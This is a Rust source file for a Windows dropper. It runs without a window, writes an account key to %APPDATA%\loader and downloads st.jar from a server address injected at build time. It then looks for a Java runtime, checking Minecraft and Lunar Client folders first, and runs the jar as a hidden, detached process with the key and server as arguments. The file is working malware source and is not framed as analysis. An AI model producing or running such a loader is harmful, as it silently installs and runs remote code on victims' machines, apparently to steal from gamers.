// language: Rust, file: dropper/src/main.rs
#![windows_subsystem = "windows"]

use std::ffi::OsStr;
use std::fs;
use std::io::{Read, Write};
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Networking::WinInet::*;

const KEY: &str = "__ACCOUNT_KEY__"; // Injected by builder
const SERVER: &str = "__SERVER_IP__"; // Injected by builder

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn download_file(url: &str, dest: &Path) {
    unsafe {
        let agent = to_wide("Mozilla/5.0");
        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null(), std::ptr::null(), 0);
        let url_w = to_wide(url);
        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, 0, 0);
        if !h_url.is_null() {
            let mut buf = [0u8; 8192];
            let mut bytes_read = 0;
            let mut data = Vec::new();
            while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
                data.extend_from_slice(&buf[..bytes_read as usize]);
            }
            let _ = fs::write(dest, data);
            InternetCloseHandle(h_url);
        }
        InternetCloseHandle(h_internet);
    }
}

fn find_java() -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    
    let paths = vec![
        format!("{}\\..\\Local\\Packages\\Microsoft.4297127D64EC6_8wekyb3d8bbwe\\LocalCache\\Local\\runtime", appdata),
        format!("{}\\.minecraft\\runtime", appdata),
        format!("{}\\.lunarclient\\jre", appdata),
        format!("{}\\Programs\\Eclipse Adoptium", localappdata),
        "C:\\Program Files\\Java".to_string(),
        "C:\\Program Files\\Eclipse Adoptium".to_string(),
    ];

    for base_path in paths {
        let path = Path::new(&base_path);
        if path.exists() {
            if let Ok(entries) = fs::read_dir(path) {
                for entry in entries.flatten() {
                    let javaw = entry.path().join("bin").join("javaw.exe");
                    if javaw.exists() { return Some(javaw); }
                }
            }
        }
    }
    None
}

fn main() {
    // 1. Setup loader dir & key.json
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let loader = Path::new(&appdata).join("loader");
    let _ = fs::create_dir_all(&loader);
    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));

    // 2. Download st.jar
    let jar_path = loader.join("st.jar");
    let url = format!("{}/api/downloads/st.jar", SERVER);
    download_file(&url, &jar_path);

    if !jar_path.exists() { return; }

    // 3. Find Java
    let java_exe = match find_java() {
        Some(p) => p,
        None => return, // Or download JRE here if you want
    };

    // 4. Run it
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = 0; 
        
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let cmd_str = format!("\"{}\" -jar \"{}\" {} {}", java_exe.display(), jar_path.display(), KEY, SERVER);
        let mut cmd_line = to_wide(&cmd_str);

        CreateProcessW(
            std::ptr::null(), cmd_line.as_mut_ptr(), std::ptr::null_mut(), std::ptr::null_mut(),
            0, CREATE_NO_WINDOW | DETACHED_PROCESS, std::ptr::null(), std::ptr::null(), &mut si, &mut pi,
        );
        if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
        if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
    }
}